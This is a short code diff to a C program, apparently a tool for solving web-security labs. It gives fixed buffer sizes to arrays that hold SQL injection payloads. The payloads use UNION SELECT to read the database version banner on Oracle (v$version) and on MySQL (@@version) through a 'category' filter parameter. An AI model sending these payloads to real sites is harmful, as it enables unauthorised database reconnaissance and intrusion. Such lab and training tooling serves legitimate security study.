@@ -304,9 +304,9 @@ int vulnerabilities(char *url) {
             clear_url(url);
 
             // step three - exploit
-            char sqli_payload_2[] = "/filter?category=Accessories'+UNION+SELECT+BANNER";
-            char sqli_payload_repeat_2[] = ",+NULL";
-            char sqli_payload_end_2[] = "+FROM+v$version--";
+            char sqli_payload_2[300] = "/filter?category=Accessories'+UNION+SELECT+BANNER";
+            char sqli_payload_repeat_2[150] = ",+NULL";
+            char sqli_payload_end_2[25] = "+FROM+v$version--";
 
             while(f > 1) {
                 strncat(sqli_payload_2, sqli_payload_repeat_2, strlen(sqli_payload_repeat_2));
@@ -355,9 +355,9 @@ int vulnerabilities(char *url) {
             clear_url(url);
 
             // step three - exploit
-            char sqli_payload_2[] = "/filter?category=Accessories'+UNION+SELECT+@@version";
-            char sqli_payload_repeat_2[] = ",+NULL";
-            char sqli_payload_end_2[] = "%23";
+            char sqli_payload_2[300] = "/filter?category=Accessories'+UNION+SELECT+@@version";
+            char sqli_payload_repeat_2[150] = ",+NULL";
+            char sqli_payload_end_2[10] = "%23";
 
             f = 1;
             while (f < i) {
